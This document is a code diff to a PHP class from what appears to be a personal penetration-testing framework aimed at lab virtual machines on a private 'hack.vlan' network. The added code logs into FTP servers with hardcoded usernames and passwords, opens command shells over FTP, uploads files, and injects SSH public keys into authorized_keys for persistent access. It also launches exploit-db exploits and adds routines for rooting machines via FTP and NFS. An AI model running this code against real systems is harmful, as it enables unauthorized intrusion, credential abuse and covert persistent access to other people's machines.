@@ -9,7 +9,97 @@ class poc4service extends poc4net {
     }
     
   
-    
+    public function poc4ftp(){
+        $this->chapitre(__FUNCTION__);
+        $eth = "vmnet6";
+        $domain = "hack.vlan";
+        
+        $this->gtitre("FTP Inject");
+        
+        $this->titre("FTP Shell CMD ");//
+        $ip = "10.60.10.179"; // 
+        $port = 21 ;
+        $remote_username_ftp = "ashoka";
+        $remote_userpass_ftp = 'kautilya';
+        
+        
+        $obj_service = new SERVICE($eth,$domain,$ip,$port, 'T',"");
+        $ftp_stream = @ftp_connect($ip,$port) ;
+        if(@ftp_login($ftp_stream, $remote_username_ftp, $remote_userpass_ftp))
+            $obj_service->ftp2cmd($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
+            ftp_close($ftp_stream);
+            
+            
+            exit();
+            
+            
+        $ip = "10.60.10.000"; // Casino Royale 
+        $port = 21 ;
+        $remote_username_ftp = "ftpUserULTRA";
+        $remote_userpass_ftp = 'bankbank';
+        
+        
+        $obj_service = new SERVICE($eth,$domain,$ip,$port, 'T',"");
+        $ftp_stream = @ftp_connect($ip,$port) ;
+        if(@ftp_login($ftp_stream, $remote_username_ftp, $remote_userpass_ftp))            
+            $obj_service->ftp2upload($ftp_stream);
+            ftp_close($ftp_stream);
+        
+        
+        exit();
+        $this->titre("FTP Inject SSH Public key to authorized_keys"); //No
+        $eth = "lo";
+        $domain = "hack.vlan";
+        $ip = "127.0.1.1"; // Chanakya
+        $port = 26921 ;
+        $remote_username_ftp = "anonymous";
+        $remote_userpass_ftp = 'anonymous';
+        
+        $obj_service = new SERVICE($eth,$domain,$ip,$port, 'T',"");
+        $ftp_stream = @ftp_connect($ip,$port) ;
+        if(@ftp_login($ftp_stream, $remote_username_ftp, $remote_userpass_ftp))
+            $obj_service->ftp2keys($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
+            ftp_close($ftp_stream);
+            
+        
+        $this->titre("FTP Inject SSH Public key to authorized_keys"); //OK 
+        $ip = "10.60.10.179"; // Chanakya
+        $port = 21 ;
+        $remote_username_ftp = "ashoka";
+        $remote_userpass_ftp = 'kautilya';
+        
+        $obj_service = new SERVICE($eth,$domain,$ip,$port, 'T',"");
+        $ftp_stream = @ftp_connect($ip,$port) ;
+        if(@ftp_login($ftp_stream, $remote_username_ftp, $remote_userpass_ftp))
+            $obj_service->ftp2keys($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
+        ftp_close($ftp_stream);
+        
+        
+        $this->titre("FTP Inject SSH Public key to authorized_keys");//OK 
+        $ip = "10.60.10.167"; // NightFall
+        $port = 21 ;
+        $remote_username_ftp = "matt"; 
+        $remote_userpass_ftp = 'cheese';
+        
+        $obj_service = new SERVICE($eth,$domain,$ip,$port, 'T',"");
+        $ftp_stream = @ftp_connect($ip,$port) ;
+        if(@ftp_login($ftp_stream, $remote_username_ftp, $remote_userpass_ftp))
+            $obj_service->ftp2keys($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
+        ftp_close($ftp_stream);
+        
+        
+        $this->titre("FTP Exploit");
+        $ip = "10.60.10.130"; // msf2  
+        $port = 21 ;
+        $msf_service_smb = new SERVICE($eth,$domain,$ip,21, 'T',"");
+        $msf_service_smb->service2exploitdb4exec();$this->pause();
+        
+        
+        $this->titre("rooting via FTP ");
+        $this->poc4root8users2sudoers8app2cmd2ftp(); // Infinity Stones 
+        
+        
+    }
     
     
     
@@ -21,7 +111,7 @@ class poc4service extends poc4net {
         $kio1_port_netbios = new PORT($ip,139, 'T');
         $kio1_port_netbios->port4pentest();$this->pause();
         
-        $kio1_service_smb = new SERVICE($ip,139, 'T');
+        $kio1_service_smb = new SERVICE4COM($ip,139, 'T');
         $kio1_service_smb->service2netbios();$this->pause();
         
         $this->titre("Be root with exploit");
@@ -165,9 +255,18 @@ class poc4service extends poc4net {
     
     public function poc4nfs(){
         $this->chapitre(__FUNCTION__);
-        $this->msf = "10.60.10.132";
-        $nfs = new SERVICE($this->msf, 2049, 'T');
-        $nfs->service2nfs();
+        
+        $flag_poc = TRUE ;
+        $eth = "vmnet6";
+        $domain = "hack.vlan";
+        
+        $this->titre("rooting via nfs");
+        $ip = "10.60.10.130"; // msf2
+        $port = 2049 ;
+        
+        $obj_service = new SERVICE($eth,$domain,$ip,$port, 'T',"");
+        $obj_service->poc($flag_poc);
+        $obj_service->service2nfs();
     }
     
     
